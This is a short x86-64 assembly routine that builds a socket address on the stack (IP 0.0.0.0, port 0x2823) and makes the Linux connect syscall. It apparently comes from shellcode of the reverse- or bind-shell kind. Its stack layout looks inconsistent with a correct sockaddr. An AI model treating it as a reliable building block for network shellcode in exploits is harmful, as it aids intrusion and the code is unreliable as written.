connect:
	push dword 0x0    ; IP
	push dword 0x2823 ; PORT
	push word 2       ; AF_INET

	mov rax, 42  ; connect
	mov rsi, rsp ; struct
	mov rdx, 16  ; struct size
	syscall
	ret
